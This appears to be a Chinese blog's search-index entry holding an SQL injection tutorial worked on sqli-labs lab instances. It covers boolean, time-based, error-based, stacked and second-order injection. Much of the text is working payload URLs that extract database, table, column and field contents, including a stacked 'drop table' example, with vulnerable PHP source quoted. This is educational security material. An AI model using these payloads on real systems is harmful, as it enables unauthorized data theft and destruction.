<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[高级SQL注入]]></title>
    <url>%2F2019%2F12%2F31%2F%E9%AB%98%E7%BA%A7SQL%E6%B3%A8%E5%85%A5.html</url>
    <content type="text"><![CDATA[高级注入安全课程简介​ 主要讲解SQL盲注基本概念，SQL盲注的挖掘方式和详细的利用过程（猜解库、表、字段名和字段内容），使用二分法基于SQL盲注漏洞的python脚本开发详解。 ​ 主要讲解常用SQL注入自动化工具的使用，非常规SQL注入漏洞的挖掘与利用，常见Waf限制下的SQL注入绕过姿势和技巧，SQL注入漏洞的防御手段详解。 一、 SQL盲注1.1 SQL盲注的概述​ 对于正常的SQL注入漏洞来说，我们一般是可以直接通过页面回显的信息情况进行判断，当前位置是否存在注入，从而进一步去猜解当前数据库的库名、表名、字段名以及字段内容。但对于SQL盲注来说，是不能通过直接显示的途径来获取数据库的数据的。在盲注中，攻击者只能根据其页面返回的不同来判断，可能是页面内容的不同（报错），也可能是页面的响应时间不同（时间）等。 1.2 SQL盲注的分类 布尔盲注 时间盲注 报错盲注 二、SQL盲注的挖掘2.1 布尔盲注2.1.1 概述​ 页面只返回True和False两种页面类型，利用页面返回不同，逐一猜解数据内容的方式，我们称为布尔盲注。 2.1.2 注入点判断方法：单引号带入法 这边使用一个sqlilab的一个环境，正常情况下请求目标服务器的url:http://192.168.55.103/Less-8/?id=1，页面是可以正常显示。 在id位置处带入单引号url:http://192.168.55.103/Less-8/?id=1&#39;,发现页面没有数据的正常回显。 注：通过页面的回显结果，正常输入页面返回正常为True，带入单引号造成原始数据库查询语句报错，返回的页面结果为空，但是并有错误信息输出，为False。通过上述测试方法判断。 源代码分析 1234567891011121314151617181920212223242526272829303132333435&lt;?php//including the Mysql connect parameters.include("../sql-connections/sql-connect.php");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123; $id=$_GET['id']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'ID:'.$id."\n"); fclose($fp); // connectivity $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size="5" color="#FFFF00"&gt;'; echo 'You are in...........'; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; &#125; else &#123;echo '&lt;font size="5" color="#FFFF00"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo "You have an error in your SQL syntax"; echo "&lt;/br&gt;&lt;/font&gt;"; echo '&lt;font color= "#0000ff" font size= 3&gt;'; &#125;&#125; else &#123; echo "Please input the ID as parameter with numeric value";&#125;?&gt; 上述代码为当前环境查询数据调用数据库的php源代码，我们主要来分析源代码中主要的部分。 $id=$_GET[&#39;id&#39;]； 接收用户输入id的值 当用户正常输入1时，此时$id=1 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;此为数据库的查询语句 用户输入数据后，原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39; LIMIT 0,1&quot;; 带入到数据库查询后，就将id=1的数据内容返回给浏览器 当我们带入非法字符单引号的时候，此时$id=1&#39; 原查询语句为 $sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39;&#39; LIMIT 0,1&quot;; 我们发现原本查询语句中有单引号，当我们带入单引号时，会导致原本的单引号无法闭合而造成查询语句报错，无法正常查询数据内容 2.2 时间盲注2.2.1 概述​ 正常情况下，当对数据库进行查询操作时，如果查询条件不存在，语句执行的时间是0ms；如果查询条件满足，语句执行速度也会非常快，接近0ms；这时候，可以使用sleep()或BENCHMARK()函数,在满足条件时，对查询的时间进行延长，通过浏览器的响应时间判断是否存在时间盲注。 2.2.3 时间布尔的区别​ 前面讲过布尔盲注，这里有小伙伴可能会质疑二者有什么区别，可以想象一个场景，无论输入任何字符（不管是正确的语句，还是恶意的注入语句），web页面都会正常显示（页面被管理员采用了”重定向”或”屏蔽”等措施），这样就无法通过布尔盲注进行判断是否存在注入了，只能通过时间延迟判断。 2.2.3 注入点判断判断函数 sleep(n) 格式：sleep(n)，n为设置的时间，单位是s(秒)； 定义：时间延迟函数，借助此函数可以在processlist中捕获到执行迅速不易被查看到的语句，以确定程序是否确实在server端发起该语句。 使用细节： 正常查询数据的时间为0s 带入sleep函数查询数据的时间 从图中我们可以清楚的看到，带入sleep函数的查询语句，查询数据的时间明显增长 benchmark()函数 格式：benchmark(count,expr)，执行表达式expr的count(重复次数) 定义：用来测试mysql进程有多快，设定好执行expr(表达式)的次数(count)，可以看到时间的变化； 使用细节： 页面延时法 首先，我们正常请求目标页面url:http://192.168.55.106/Less-9/?id=1，页面正常返回数据结果 带入单引号进行测试尝试，此时url为url:http://192.168.55.106/Less-9/?id=1&#39;，请求之后我们发现页面显示结果和原来一样，没有任何变化。这就回到我们所讲到的时间盲注和布尔盲注的一个区别，我们可能无法从页面响应结果进行直接判断。 带入sleep函数镜进行测试判断，此时url为url:http://192.168.55.106/Less-9/?id=1&#39; and sleep(5)--+，我们发现页面结果的回显时间明显增长。 综上测试过程，我们可以通过页面响应的时间判断，当前页面是否存在注入。当我们带入sleep函数时，我们可以判断出因为sleep能延长数据的查询时间，我们在请求页面时，我们构造的sleep函数被带入到了原有的查询语句中去执行，导致了页面响应时间变长，由此我们可以判断出当前页面存在时间盲注。 源代码分析 123456789101112131415161718192021222324252627282930if(isset($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; $id=$_GET[&#39;id&#39;]获取用户输入的id值 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;数据库执行语句 在前面我们带入延时函数的格式为1&#39; and sleep(5)--+ 从原语句我们可以看出我们带入构造语句后，原查询语句变成: SELECT * FROM users WHERE id=&#39;1&#39; and sleep(5)--+&#39;LIMIT 0,1 这里的单引号用来闭合前一个单引号 –+为sql代码中的注释符，它可以将后面的代码完全注释掉，就形成了一个新的查询语句执行，这样sleep函数就被成功写入，导致查询数据结果的时间变长。 2.3 报错盲注2.3.1 原理​ 基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而使我们得到想要的基本信息——数据库名、版本、用户名等。 ​ 因为mysql有一个bug，这个bug在使用count() group by 对一些rand()函数进行操作时会返回错误信息rand()产生的数列是关键，而且想获取的数据库信息会显示在报错信息中。 2.3.2 涉及函数count() 作用:统计元组（每条数据）的个数。 rand() 作用：随机取0-1的数字 通常和floor()函数（向下取整）连用，将rand()乘以 2 是为了能得到 1 和 0 两个随机数； concat()函数 作用：聚合函数，将多个列数据合并到一个字符串中 exp()函数 作用: 返回以e的x次方的值； 格式：exp(x) 漏洞利用：使double类型的数值超出范围从而查看报错的信息，需要mysql版本在5.5.x及以上,但是在mysql&gt;5.5.53时，则不能返回查询结果 利用语句： 1select exp(~(select * from(select version())as a )); updatexml()函数 作用: 对xml文档进行查询和修改； 格式：updatexml(xml_document,XPath_string,new_value); xml_document: String格式,为xml文档对象的名称; XPath_string: Xpath格式的字符串,可以了解下xpath语法; new_value: String格式,替换查找到的符合条件的数 报错利用：mysql版本需要5.1.x及以上 利用命令： 1select 1,updatexml(1,concat(char(38),(select @@version),char(38)),1); extractvalue()函数 作用：对xml文档进行查询和修改； 格式：extractvalue(xml_frag,xpath_expr) xml_frag: xml标记 xpath_expr: xpath表达式 报错利用：利用extractvalue函数的报错信息获取信息，mysql版本需要5.1.x及以上 利用命令： 1select 1,extractvalue(1,concat(char(38),(select @@version),char(38))); group by 作用：聚合函数，根据一个或多个列对结果集进行分组并有排序功能 报错注入公式 select count(*),concat(0x22,database(),0x22,floor(rand(0)*2))x from information_schema.tables group by x; 0x22: 表示双引号 x:相当于把concat获取的数据列更名为x，也是为了方便group by的操作 注：疑问解答，这里的rand内为什么要加0？ rand内加随机因子0是保证报错百分之百触发 不加随机因子0，可能不触发报错 关键表被禁用，可用如下格式 1select count(*) from (select 1 union select null union select !1) as a group by concat(version(),floor(rand(0)*2)); 注：这边一定要对select 1 union select null union select !1这个语句使用别名，否则会报错 rand()函数被禁用 1select min(@a:=1) from information_schema.tables group by concat(database(),@a:=(@a+1)%2); 利用myslq的重复性导致报错来获取信息 1select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 2.3.3 注入点的判断源代码分析 123456789101112131415161718192021222324252627if(($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);fclose($fp);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; 查看源码，与原来的没差。但是我们发现，在判断语句当中，当sql语句正确的情况下，直接输出You are in的字符串。 但是当我们构造报错语句，导致sql报错，这边的print_r(mysql_error());语句就会输出错误语句到浏览器端供用户查看。这边我们就可以更好利用报错注入进行相关数据库的注入攻击。 单引号带入 正常请求：url:http://192.168.55.104/Less-5/?id=1 单引号带入: url:http://192.168.55.104/Less-5/?id=1&#39; 综上测试，发现数据库报错，判断存在注入。并且这边只是输出了错误信息。只能用报错盲注。 三、 SQL盲注的利用3.1 二分法3.1.1 二分法定义​ 二分法查找又称折半查找。二分法查找是在一个有序列表的基础上完成的。要查找的值x和列表的中间值m作比较，若x大于m，那么接下来从m+1的右区间内再以相同的方法取中间值作比较，循环往复此过程知道判断出x=m时即查找成功，否则相反，返回类型为布尔类型。 ​ 时间复杂度为：O(logn) 空间复杂度： O(1) 3.1.2 二分法实例 现有一个游戏场景，一个聚会当中，一个人在1-100以内的数中随机取出一个数，然后让其他人来猜，可以告诉猜大了或是猜小了，然后直到猜出这个数为止。 python代码实现如下： 1234567891011121314151617181920212223242526#/usr/bin/env python3#Author:Mr.zhang#Data:2020-1-9def BinarySearch(list1, num): min = 0 # 最小的下标 max = len(list1) - 1 # 最大的下标 i = 0 while True: i += 1 mid = (max + min) // 2 # 中间的下标每次向下取整 if num &gt; list1[mid] : min = mid + 1 # 小于需要的猜的数，则将最小下标变为中间的，又因为中间的已经猜过，所以要加1 elif num == list1[mid] : print("找到数据") print("一共查找%d次"%i) break else : max = mid - 1 # 大于需要的猜的数，则将最大下标变为中间的，又因为中间的已经猜过，所以要减1 if __name__ == "__main__": list1 = [i for i in range(0,100)] num = 83 BinarySearch(list1, num) 3.2 布尔盲注3.2.1 常用函数详解mid()函数 作用：截取字符串的一部分 使用格式：mid(column_name,start,length) 在盲注中对数据库中信息进行猜解时，使用该函数进行逐位或者多位猜解： 可以在mid函数的column_name插入完整的sql语句,需要用括号将sql语句括起来： substr()函数 作用：substr()和substring()函数实现的功能是一样的，都是截取字符串． 使用格式：string substr(string, start, length)；其参数含义和mid()函数一样． left()函数 作用：截取字符串从左边开始指定个数的字符； 使用格式：left ( string, n ), string: 要截取的字符串，n: 长度; ord()函数 作用：返回第一个字符(指start的值)的ASCII码（也可以使用ascii()函数)，一般与上面的函数组合使用 使用格式：mid(concent,start,length); 其参数含义和mid()函数一样 D的ascii码值为68 regexp正则注入 作用：使用正则表达式匹配表 使用格式: regexp ‘表达式’ 如果符合正则匹配，则显示前面sql语句执行的结果；反之则会显示set```.通常使用```limit 0,1```只显示第一条数据．1234567891011121314151617181920212223242526272829303132333435363738394041424344454647![image-20200113100425526](./_images/image-20200113100425526.png)**like****作用：** 和regexp正则注入类似![image-20200113100628303](./_images/image-20200113100628303.png)![image-20200113100708046](./_images/image-20200113100708046.png)### 3.2.2 猜解库名​ 根据注入点判断测试，发现存在布尔盲注，进行库名拆解。利用sqlilab的实验8进行相应实验测试，我们发现布尔盲注在正常请求页面的情况下，页面显示&quot;You are in...&quot;字符串；查询数据错误时，页面没有任何数据信息显示，以此为判断依据进行判断。**第一步：判断数据库库名的长度**`http://192.168.55.107:8080/Less-8/?id=1&apos; and length(database())&gt;7--+`测试库名大于7时，页面数据正常回显，如下图所示：![image-20200113104930395](./_images/image-20200113104930395.png)测试库名大于8时，页面数据没有没有回显，如下图所示：![image-20200113105111766](./_images/image-20200113105111766.png)由此可判断，数据存在一个临界值，这个值即为当前数据库库名的长度，长度为8**第二步：判断数据库的库名**`http://192.168.55.107:8080/Less-8/?id=1&apos; and ascii(substr(database(),1,1))&gt;114--+`由第一步已知当前数据库的库名长度为8，判断库名的第一位的ascii的值进行比较，当测试值为114时，当前页面数据正常回显，如下图所示:![image-20200113110947331](./_images/image-20200113110947331.png)当测试值为115时，当前页面数据回显结果为空，如下图所示：![image-20200113111046067](./_images/image-20200113111046067.png)由此可判断，数据存在一个临界值，这个值即为当前库名第一位的ascii值为115，对应字符为s以此类推判断当前库名的后续字符值，获取当前数据库的库名。### 3.2.3 猜解表名**第一步:拆解当前数据库中表的数量** http://192.168.55.106:8080/Less-8/?id=1&#39; and (select count(table_name) from information_schema.tables where table_schema=’security’) &gt;3–+123456789101112131415由前序步骤可知，当前数据库的库名为"security",判断当前库下表的数量，当带入值为3时，当前页面数据正常回显，如下图所示：![image-20200115133524556](./_images/image-20200115133524556.png)当测试值为4时，当前页面数据回显结果为空，如下图所示：![image-20200115133656165](./_images/image-20200115133656165.png)由此可判断，数据存在一个临界值，这个值即为当前库下表的数量为4。**第二步:拆解当前数据库中其中一个表的表名**```sqlhttp://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)) &gt; 100--+ 由前序步骤可知，当前数据库的库名为”security”,当前库中表的数量为4，判断当前库中第一表表名的第一字母，当带入值为100时，当前页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)) &gt; 101--+ 当带入值为101时，当前页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前表名第一位的ascii值为101，对应字符为e 以此类推判断当前表名的后续字符值，获取当前数据库中的第一个表名。 3.2.4 猜解字段名第一步:拆解表中字段的数量 1http://192.168.55.106:8080/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema='security' and table_name='emails') &gt; 1--+ 由前序步骤可知，当前数据库的库名为”security”、第一个表名为”emails”,判断当前库下表的数量。 当带入值为1时，当前页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_schema='security' and table_name='emails') &gt; 2--+ 当带入值为2时，当前页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前emails表中字段的数量为2。 第二步:拆解表中字段的第一个字段的名称 1http://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),1,1))&gt; 104--+ 由前序步骤可知，当前数据库的库名为”security”、第一个表名为”emails”,判断当前表中第一个字段中第一个字母为。 当带入值为104时，当前页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),1,1))&gt; 105--+ 当带入值为105时，当前页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段名第一位的ascii值为105，对应字符为i 以此类推判断当前字段名的后续字符值，获取当前表中的第一个字段名称。 3.2.5 猜解字段内容第一步:拆解字段内容数量 1http://192.168.55.106:8080/Less-8/?id=1' and (select count(id) from emails) &gt; 7--+ 获取emails表中，id字段的内容数量 当带入值为7时，页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and (select count(id) from emails) &gt; 8--+ 当带入值为8时，页面数据回显结果为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段内容数量8 第二步:拆解字段内容长度 1http://192.168.55.106:8080/Less-8/?id=1' and length((select id from emails limit 0,1))&gt;0--+ 获取id字段中，第一个字段内容的长度 当带入值为0时，页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and length((select id from emails limit 0,1))&gt;1--+ 当带入值为1时，页面数据回显结果为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段长度值1。 按照此步骤可以一次判断其他字段的长度。 第三步:拆解字段内容 1http://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((select id from emails limit 0,1),1,1)) &gt;48--+ 获取字段中第一位的字段内容的ascii码值 当带入值为48时，页面数据正常回显，如下图所示： 1http://192.168.55.106:8080/Less-8/?id=1' and ascii(substr((select id from emails limit 0,1),1,1)) &gt;49--+ 当带入值为49时，页面数据回显为空，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前id字段第一个内容第一位ascii码值为49，即为数字1 后续字段内容按此步骤继续判断即可。 若要获取库中其他信息，按以上步骤，修改payload中的值即可获取特性的内容。 3.3 时间盲注3.3.1 常用函数详解if()函数 格式：if(expr1,expr2,expr3) 定义：判断函数，如果expr1是TRUE(expr1&lt;&gt; 0 and expr1 &lt;&gt; null,”&lt;&gt;”是不等于的意思)，则if()返回值是expr2；否则返回值为expr3。返回值类型为数字或者字符串，具体情况需要视所在语境而定。 使用细节: select * from users; select if(id &gt; 7, &#39;exist&#39;, &#39;null&#39;) from users 3.3.2 拆解库名第一步：猜解库名长度 1http://192.168.2.102:8080/Less-9/?id=1' and if(length(database())&gt;7,sleep(3),1)--+ 当带入值为7时，页面响应时间增长，响应时间为3s,如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1' and if(length(database())&gt;8,sleep(3),1)--+ 当带入值为8时，页面响应时间不变，如下图所示： 由此可判断当前数据库库名长度为8 第二步：猜解库名 1http://192.168.2.102:8080/Less-9/?id=1' and if(ascii(substr(database(),1,1))&gt;114,sleep(3),1)- -+ 当带入的值为114时，页面响应时间为3s，如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1' and if(ascii(substr(database(),1,1))&gt;115,sleep(3),1)--+ 当带入的值为115时，页面响应时间正常 ，如下图所示： 由此可判断库名的第一个字母的ascii值为115，即s 重复以上方法依次判断库名后续字母的ascii值，获取后续字母 最终得到库名为security 3.3.3 猜解表名第一步：猜解表名数量 1http://192.168.2.102:8080/Less-9/?id=1' and if((select count(table_name) from information_schema.tables where table_schema='security')&gt;3,sleep(3),1)--+ 当带入的值为3时，页面响应时间为3s，如下图所示： 当带入的值为4时，页面响应时间正常 ，如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1' and if((select count(table_name) from information_schema.tables where table_schema='security')&gt;4,sleep(3),1)--+ 由此可判断，当前库中表的数量为4 第二步：猜解表的长度 1http://192.168.2.102:8080/Less-9/?id=1' and if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))&gt;5,sleep(3),1)--+ 当带入的值为5时，页面响应时间为3s，如下图所示： 1http://192.168.2.102:8080/Less-9/?id=1' and if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))&gt;6,sleep(3),1)--+ 当带入的值为6时，页面响应时间正常，如下图所示： 由此可判断，当前库中第一个表的表名长度为6 第三步：猜解表名 1http://192.168.2.102:8080/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;100,sleep(3),1)--+ 当带入的值为100时，页面响应时间为3s，如下图所示： 当带入的值为101时，页面响应时间正常，如下图所示： 由此可判断，第一个表名的第一个字母ascii值为101，即为e 重复以上方法一次判断后续字母和后续表名 库中的四个表名依次为：emails、referers、uagents、users 3.3.4 猜解字段名第一步：猜解users表中字段数量 1http://192.168.55.104:8080/Less-9/?id=1' and if((select COUNT(column_name) from information_schema.columns where table_schema='security' and table_name='users')&gt;2,sleep(3),1)--+ 带入值为2时，页面响应时间为3s，如下图所示： 1http://192.168.55.104:8080/Less-9/?id=1' and if((select COUNT(column_name) from information_schema.columns where table_schema='security' and table_name='users')&gt;3,sleep(3),1)--+ 带入值为3时，页面响应时间正常，如下图所示： 由此可判断，users表中有3个字段 第二步：判断字段名称长度 1http://192.168.55.104:8080/Less-9/?id=1' and if(length((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1))&gt;1,sleep(3),1)--+ 当带入值为1时,页面响应时间为3s，如下图所示: 1http://192.168.55.104:8080/Less-9/?id=1' and if(length((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1))&gt;2,sleep(3),1)--+ 但带入的值为2时，页面的响应时间正常，如下图所示： 由此可判断，当前字段名长度为2 第三步：判断字段名 1http://192.168.55.100:8080/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))&gt;104,sleep(3),1)--+ 当带入的值为104时，页面的响应时间为3s，如下图所示： 1http://192.168.55.100:8080/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))&gt;105,sleep(3),1)--+ 当带入的值为105时，页面的响应时间正常，如下图所示： 由此可判断，当前字段的第一个字母的ascii值为105，即为i 以此方法循环判断当前表中的字段名称依次为：id、email_id 3.3.5 猜解字段内容第一步:拆解字段内容数量 1http://192.168.2.220:8080/Less-9/?id=1' and if((select count(id) from emails) &gt; 7,sleep(3),1)--+ 获取emails表中，id字段的内容数量 当带入值为7时，页面回显时间明显变长，如下图所示： 1http://192.168.2.220:8080/Less-9/?id=1' and if((select count(id) from emails) &gt; 8,sleep(3),1)--+ 当带入值为8时，页面数据回显时间正常，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段内容数量8 第二步:拆解字段内容长度 1http://192.168.2.220:8080/Less-9/?id=1' and if(length((select id from emails limit 0,1))&gt;0,sleep(3),1)--+ 获取id字段中，第一个字段内容的长度 当带入值为0时，页面回显时间明显变长，如下图所示： 1http://192.168.2.220:8080/Less-9/?id=1' and if(length((select id from emails limit 0,1))&gt;1,sleep(3),1)--+ 当带入值为1时，页面回显时间正常，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前字段长度值1。 按照此步骤可以一次判断其他字段的长度。 第三步:拆解字段内容 1http://192.168.2.220:8080/Less-9/?id=1' and if(ascii(substr((select id from emails limit 0,1),1,1)) &gt;48,sleep(3),1)--+ 获取字段中第一位的字段内容的ascii码值 当带入值为48时，页面回显时间明显增长，如下图所示： 1http://192.168.2.220:8080/Less-9/?id=1' and if(ascii(substr((select id from emails limit 0,1),1,1)) &gt;49,sleep(3),1)--+ 当带入值为49时，页面回显时间正常，如下图所示： 由此可判断，数据存在一个临界值，这个值即为当前id字段第一个内容第一位ascii码值为49，即为数字1 后续字段内容按此步骤继续判断即可。 若要获取库中其他信息，按以上步骤，修改payload中的值即可获取特性的内容。 3.4 报错盲注3.4.1 常用函数详解​ 见 2.3.2中有详解。 3.4.2 获取数据版本信息和库名1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat(version(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 3.4.3 获取数据库的表名1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 修改对应limit的第一个参数可以获取其他表名。 3.4.4 获取表中的字段名1shttp://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 3.4.5 获取字段中的内容1http://192.168.2.220:8080/Less-5/?id=1' union select 1,count(*),concat((select id from emails limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 四、基于SQL盲注的脚本开发​ 见sql盲注脚本 五、常见SQL注入的挖掘与利用5.1 堆叠注入5.1.1 堆叠注入的原理​ 堆叠注入和前面介绍的uinon联合注入有异曲同工之妙，用法类似，只是不需要堆叠注入使用的；结束前面的sql语句： 在使用；(分号)结束一个sql语句后，可以继续构造下一条sql语句； 1select * from admin;drop table admin; //执行这个语句先查询admin表内容，后删除admin表； 5.1.2 堆叠注入的优缺点优点： ​ 使用union联合注入时，须保证前后两个sql语句的可显示字段数量要相同，使用堆叠注入则不需要考虑这个限制，其可以执行任意语句； 缺点： ​ 堆叠注入并不是每个环境下都可以执行，有可能会受到api或者数据库引擎不支持的限制； 目前已知支持堆叠注入的有： asp sql server ASP.NET SQL SERVER PHP SQL SERVER MYSQL 5.1.3 堆叠注入的利用判断存在注入点 ​ 带入单引号，数据返回错误信息，判断当前存在注入点 1http://192.168.2.220:8080/Less-38/?id=-1' 使用order by判断字段位数 ​ 当带入的值为3时，页面响应正常 1http://192.168.2.220:8080/Less-38/?id=1'order by 3--+ ​ 当带入的值为4时，页面响应异常，判断判断当前表中字段长度为3 1http://192.168.2.220:8080/Less-38/?id=1'order by 4--+ 使用联合查询获取所有库名 1http://192.168.2.220:8080/Less-38/?id=-1' union select 1,group_concat(schema_name),2 from information_schema.schemata --+ 新增库判断是否存在堆叠注入 1http://192.168.2.220:8080/Less-38/?id=-1';create database duidietest--+ 利用查库重新获取当前mysql的所有库名，发现新增库名成功，则判断是堆叠注入 1http://192.168.2.220:8080/Less-38/?id=-1' union select 1,group_concat(schema_name),2 from information_schema.schemata --+ 注：后续获取数据库内容的方式雷同这里不再过多赘述。 5.2 二次注入5.2.1 注入和二次注入的区别sql注入流程： 1.攻击者在注入点输入恶意sql语句，通过http请求提交； 2.服务器中的应用程序处理恶意的sql，并向攻击者返回注入结果； 二次注入流程： 1.攻击者在注入点提交恶意sql语句； 2.通过http请求，将恶意sql保存到应用程序的数据库中； 3.攻击者第二次提交http请求； 4.服务器处理第二次http请求，检索存储在数据库中的恶意sql，构造sql语句； 5.服务器向攻击者返回注入结果； 5.2.2 二次注入的原理​ 数据首次插入到数据库中时，应用程序会以（ addslashes 或者是借助get_magic_quotes_gpc 对其中的特殊字符进行转义)安全的方式处理这些数据,但是，这些数据可能会被应用程序本身或者其他的后端进程会以危险的方式处理这些数据，从而造成了二次注入。 5.2.3 二次注入的利用判断注入点 ​ 在Less-24实验中，首页的登录界面进行相应的判断测试，测试判断是否存在注入点。但是不管怎么构造参数带入均发现页面如下情况，没有任何其他变化，所以判断此处无注入点。 源码分析 12345678910111213141516function sqllogin()&#123; $username = mysql_real_escape_string($_POST["login_user"]); $password = mysql_real_escape_string($_POST["login_password"]); $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'"; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); //print_r($row) ; if ($row[1]) &#123; return $row[1]; &#125; else &#123; return 0; &#125;&#125; 通过代码分析发现，数据接收参数login_user和login_password都会经过函数mysql_real_escape_string（）处理字符串。 此函数的具体定义如下： ​ mysql_real_escape_string函数转义SQL语句中使用的字符串中的特殊字符. ​ 受影响字符： ​ \x00 ​ \n ​ \r ​ \ ​ ‘ ​ “ ​ \x1a 使用此函数后，基本上使用这个点注入不太可能。 首页的登录页不行，发现登录页下面还有两个功能。一个是忘记密码，你一个注册新用户。 这里我们首先注册一个test用户，密码为111111，然后使用此用户进行登录，登录后的页面如下图所示： 我们发现登录成功之后是一个用户的登录后台页，并且该页面支持当前用户的密码修改，修改密码的代码页名称为pass_change.php. 我们查看当前页面修改密码的源代码，并进行相应的分析： 1234567891011121314151617181920212223242526272829303132333435if (isset($_POST['submit']))&#123; # Validating the user input........ $username= $_SESSION["username"]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); if($pass==$re_pass) &#123; $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "; $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( '); $row = mysql_affected_rows(); echo '&lt;font size="3" color="#FFFF00"&gt;'; echo '&lt;center&gt;'; if($row==1) &#123; echo "Password successfully updated"; &#125; else &#123; header('Location: failed.php'); //echo 'You tried to be smart, Try harder!!!! :( '; &#125; &#125; else &#123; echo '&lt;font size="5" color="#FFFF00"&gt;&lt;center&gt;'; echo 